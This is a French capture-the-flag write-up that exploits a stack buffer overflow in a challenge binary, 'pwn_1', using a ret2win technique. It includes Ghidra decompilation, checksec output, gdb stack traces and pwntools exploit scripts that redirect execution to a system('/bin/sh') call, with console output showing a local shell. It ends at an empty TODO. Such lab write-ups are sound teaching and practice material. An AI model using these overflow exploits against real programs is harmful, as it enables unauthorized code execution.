# Pwn_1

## Analyse statique

À l'aide de Ghidra on retrouve :

- un buffer overflow dans `main` :

```C
char local_12 [10];

puts(&DAT_00402340);
fgets(local_12,50,stdin);
```

- une fonction `win` qui ouvre un shell :

```C
system("/bin/sh");
```

Vérifions les sécurités activées sur le binaire :

```console
$ checksec --file pwn_1 
[*] '/tmp/coucou/pwn_1'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
```

Pas de canary : nous pouvons utiliser le buffer overflow pour rediriger le programme.
Pas de PIE : nous pouvons avoir l'adresse de `win`.

Nous sommes dans le cas d'un [ret2win](https://ir0nstone.gitbook.io/notes/binexp/stack/ret2win). Il faut réecrire par dessus l'adresse utiliser pour `return` dans le main, et rediriger le programme vers la fonction `win` pour obtenir un `shell`.

## Analyse dynamique

Le padding nécessaire pour rediriger le programme :

```python
from pwn import *

payload = b"".join([
    b"A"*18,
    b"B"*8,
])

p = process("./pwn_1")
input("Waiting for debuger")
p.send(payload+b"\n")
p.interactive()
```

```gdb
───────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007ffd7c6f1e38│+0x0000: "BBBBBBBB\n"	 ← $rsp
0x00007ffd7c6f1e40│+0x0008: 0x00007ffd7c6f000a  →  0x0000000000000000
0x00007ffd7c6f1e48│+0x0010: 0x00007ffd7c6f1f58  →  0x00007ffd7c6f2fbc  →  0x00315f6e77702f2e ("./pwn_1"?)
0x00007ffd7c6f1e50│+0x0018: 0x0000000100400040 ("@"?)
0x00007ffd7c6f1e58│+0x0020: 0x00000000004011b7  →  <main+0000> push rbp
0x00007ffd7c6f1e60│+0x0028: 0x00007ffd7c6f1f58  →  0x00007ffd7c6f2fbc  →  0x00315f6e77702f2e ("./pwn_1"?)
0x00007ffd7c6f1e68│+0x0030: 0x3c27ced470f780c2
0x00007ffd7c6f1e70│+0x0038: 0x0000000000000001
───────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
     0x4011e6 <main+002f>      call   0x401030 <puts@plt>
     0x4011eb <main+0034>      mov    eax, 0x0
     0x4011f0 <main+0039>      leave  
 →   0x4011f1 <main+003a>      ret    
[!] Cannot disassemble from $PC
───────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "pwn_1", stopped 0x4011f1 in main (), reason: SIGSEGV
```

Depuis Ghidra nous pouvons retrouver l'adresse de la function `win` : `0x00401156`.

## Exploit

```python3
from pwn import *

system = 0x401156

payload = b"".join([
    b"A"*18,
    p64(system),
])

p = process("./pwn_1")
p.send(payload+b"\n")
p.recvuntil(b"adorable...\n")
p.interactive()
```

```console
$ python3 solve.py 
[+] Starting local process './pwn_1': pid 47796
Waiting for debugeur
[*] Switching to interactive mode
Vas-y, tape ton précieux mot de passe... si tu l'oses ! Voyons voir si tu arrives à te connecter ahaha
Haha, tu as vraiment cru que quelque chose allait se passer ? Je t’ai dit que tu ne pouvais pas te connecter ! Continue d’essayer, c’est adorable...
LOGGED IN

User : Admin

Options :
1 - shell
2 - exit
$ 1
Quoi ?! Comment es-tu arrivé ici ?! Je savais que j’aurais dû supprimer tout ça… Peu importe, je ne te laisserai pas aller plus loin !
[*] Got EOF while reading in interactive
$ 
[*] Process './pwn_1' stopped with exit code -11 (SIGSEGV) (pid 47796)
[*] Got EOF while sending in interactive
```

Nous sommes arrivé jusqu'à la fonction `win`, mais pas de shell... En regardant la fonction de plus prêt :

```C
fgets(user_input,2,stdin);
strcmp_return_code = strcmp(user_input,"1");
if (strcmp_return_code == 0) {
    puts(&DAT_004022a8);
    if (user_input[0] == '\0') {
        system("/bin/sh");
    }
}
```

Pour passer cette condition : `if (strcmp_return_code == 0) {`, il faut saisir `1`. Mais pour atteindre le shell, il faut que `user_input` soit vide : `if (user_input[0] == '\0') {`. Se sont des conditions insatisfiable. Plutôt que d'exécuter toute la fonction `win`, nous allons donc directement aller à l'exécution de `system` qui nous intéresse :

```gdb
   0x00000000004011aa <+84>:	mov    edi,0x40232e
   0x00000000004011af <+89>:	call   0x401040 <system@plt>
```

```python
from pwn import *

system = 0x4011aa

payload = b"".join([
    b"A"*18,
    p64(system),
])

p = process("./pwn_1")
p.send(payload+b"\n")
p.recvuntil(b"adorable...\n")
p.interactive()
```

```console
$ python3 solve.py 
[+] Starting local process './pwn_1': pid 48700
[*] Switching to interactive mode
$ whoami
geoffrey
$ exit
[*] Got EOF while reading in interactive
$ 
[*] Process './pwn_1' stopped with exit code -7 (SIGBUS) (pid 48700)
[*] Got EOF while sending in interactive
```

Plus qu'à lancer sur le serveur :

## TODO
